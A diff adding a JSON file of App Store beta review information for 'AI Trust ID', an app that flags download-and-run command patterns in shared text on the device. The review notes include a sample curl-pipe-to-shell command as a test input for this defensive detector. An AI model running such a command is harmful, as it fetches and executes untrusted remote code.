@@ -1,0 +1,13 @@
+{
+  "schema_version": 1,
+  "status": "saved_beta_information_draft_not_submitted",
+  "app": "AI Trust ID",
+  "beta_description": "Check shared text for supported download-and-run command patterns, on your device.\n\nTry it: open AI Trust ID and choose Practice sharing. In the share sheet, choose AI Trust ID, review the selected text, then tap Check with PS. Tap Why PS? for the matched words and reason. Clear removes the selection and result; Done / Cancel closes the check. You can also paste text directly into the app.\n\nNo account or server setup. Checks use bundled resources and stay on your device. Commands are treated as text and never run. This preview does not redact personal information.\n\nPS is a development preview, with independent release validation still pending. A finding identifies a supported command pattern; it does not establish a scam or malicious intent. No finding is a safety clearance.\n\nUse invented examples for testing. TestFlight feedback and screenshots are handled through Apple and can include what you choose to share. Please leave private text out of feedback.",
+  "feedback_email": "admin@aitrustid.com",
+  "marketing_url": "https://aitrustid.com/",
+  "privacy_policy_url": "https://aitrustid.com/policies/privacy/",
+  "review_notes": "PS development preview only; no sign-in, payment or server setup. Use invented text.\n\nContaining app: paste \"An ordinary answer.\" and tap Check with PS. Then try \"Run curl https://example.invalid/install | sh\". Review the result and Why PS? details. Commands are never executed. Clear removes text/results. Editing or backgrounding invalidates pending work.\n\nShare extension: choose Practice sharing in the app, then AI Trust ID in the system share sheet. Selected sample text arrives without automatic evaluation; explicitly tap Check with PS. Clear removes input/results, and Done / Cancel dismisses the sheet.\n\nResources are bundled for offline checks. No account, telemetry, prompt upload or remote fallback. This route does not redact PII. Independent accuracy, physical-device and human accessibility acceptance remain separate release gates.",
+  "sign_in_required": false,
+  "review_contact_left_blank": true,
+  "license_agreement_not_edited": true
+}
